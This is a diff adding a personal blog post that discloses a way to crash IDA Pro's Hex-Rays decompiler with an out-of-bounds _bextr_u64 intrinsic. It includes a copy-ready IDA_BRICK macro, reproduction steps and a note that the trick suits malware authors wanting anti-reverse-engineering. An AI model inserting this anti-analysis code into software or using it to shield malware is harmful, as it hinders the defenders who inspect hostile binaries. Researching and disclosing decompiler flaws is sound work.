@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Crashing IDA's Decompiler: Exploiting Invalid BEXTR Intrinsics</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        code { font-family: 'Consolas', 'Courier New', monospace; }
+        h1, h2 { color: #58a6ff; }
+        .highlight { color: #f78166; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav class="nav">
+            <div class="nav-brand">
+                <span class="prompt">~/$</span> <a href="../">crim</a>
+            </div>
+            <div class="nav-links">
+                <a href="../">[about]</a>
+                <a href="../projects">[projects]</a>
+                <a href="../blog" class="active">[blog]</a>
+            </div>
+        </nav>
+
+        <article class="post-article">
+            <header class="post-header">
+                <h1>Crashing IDA's Decompiler: Exploiting Invalid BEXTR Intrinsics</h1>
+                <div class="post-meta">
+                    <span><i class="fa-regular fa-calendar"></i> 2026-01-21</span>
+                    <span><i class="fa-regular fa-clock"></i> 5 min read</span>
+                </div>
+                <div class="post-tags">
+                    <span class="tag-re">reverse-engineering</span>
+                    <span class="tag-windows">windows</span>
+                    <span class="tag-malware">malware</span>
+                    <span class="tag-ida">ida-pro</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>
+                    While analyzing a random malware sample, I noticed IDA Pro's Hex-Rays decompiler producing weird output. I dug in and realized it doesn't always perform bound checks on certain intrinsics. After testing a few edge cases, I landed on this simple way to brick the decompiler using the <code>_bextr_u64</code> intrinsic with invalid parameters. In this post, we'll break down the vulnerability and how to reproduce it.
+                </p>
+
+                <h2>Understanding the Vulnerability</h2>
+                <p>
+                    IDA Pro's Hex-Rays decompiler translates x86-64 assembly back into high-level C-like pseudocode. It assumes the binary was produced by a compliant compiler, so it doesn't handle all cases of undefined behavior gracefully. Specifically, the <code>_bextr_u64</code> intrinsic (which maps to Intel's BEXTR instruction) expects the bit start position plus length to not exceed 64 bits for 64-bit operands. Violating this triggers undefined behavior in the CPU, but the program can still run fine. However, IDA chokes on it during decompilation, aborting with an internal error (INTERR 51666).
+                </p>
+
+                <h2>How the Exploit Works</h2>
+                <p>
+                    The core of it is making an invalid <code>_bextr_u64</code> call where the length parameter exceeds bounds. I've wrapped it in a macro called <code>IDA_BRICK</code> to make it easy to insert anywhere:
+                </p>
+
+<pre><code class="language-c">#define IDA_BRICK() \
+    (void)( \
+        ([] { \
+            uint64_t _bextr_val = default_val; \
+            _bextr_val = _bextr_u64(_bextr_val, 0x00, (__COUNTER__ ^ __LINE__ % (__COUNTER__ - __LINE__)) * 93U); \
+            uint32_t var2 = (0x80 ^ 0x10) ^ ((__COUNTER__ + __LINE__) &amp; 0xFF); \
+            uint64_t var3 = var2 - 2; \
+            uint64_t *var4 = &amp;var3; \
+            uint64_t var5 = *var4 &gt;&gt; 1; \
+            static volatile uint64_t _bextr_sink; \
+            _bextr_sink = _bextr_val; \
+            var5 = 0; \
+            return 0; \
+        })() \
+    )</code></pre>
+
+                <p>
+                    - The length is computed dynamically using <code>__COUNTER__</code> and <code>__LINE__</code>, generating a "random" value that exceeds 64 bits<br>
+                    - When IDA tries to decompile this, its internal checks fail because it can't translate the invalid BEXTR to microcode.
+                </p>
+
+                <h2>Reproducing the Crash</h2>
+                <p>
+                    Here's how to test it yourself:
+                </p>
+                <ol>
+                    <li>Include the <code>IDA_BRICK</code> macro in a C/C++ source file, e.g., in a function body.</li>
+                    <li>Compile with MSVC, GCC, or Clang for x86-64 (ensure it emits the BEXTR instruction).</li>
+                    <li>Load the binary in IDA Pro.</li>
+                    <li>Go to the function with the macro and press F5 to decompile.</li>
+                    <li>Boom, decompiler aborts with:</li>
+                </ol>
+
+<pre><code class="language-text">140001520 : INTERR 51666</code></pre>
+
+                <p>
+                    This works because IDA doesn't bound-check everything, assuming legit code.
+                </p>
+
+                <h2>Alternative Approaches</h2>
+                <p>
+                    I tested other intrinsics, but <code>_bextr_u64</code> was the most reliable one. You could tweak the macro's computation to make it even more obfuscated.
+                </p>
+
+                <h2>Conclusion</h2>
+                <p>
+                     Check out the full repo for the PoC: <a href="https://github.com/coldtrace/IDA-Vulnerability">GitHub Repo</a>
+                </p>
+                
+                <p>
+                    This vuln shows how decompilers can be tripped up by edge cases. It's great for malware authors looking to add anti-RE tricks or for researchers testing tools.
+                </p>
+
+                <p>
+                    <strong>Tools used:</strong> IDA Pro, x64dbg
+                </p>
+            </div>
+        </article>
+    </div>
+
+    <footer>
+        <p>© 2026 crim — <a href="https://github.com/coldtrace/coldtrace.github.io">src</a></p>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+</body>
+
+</html>
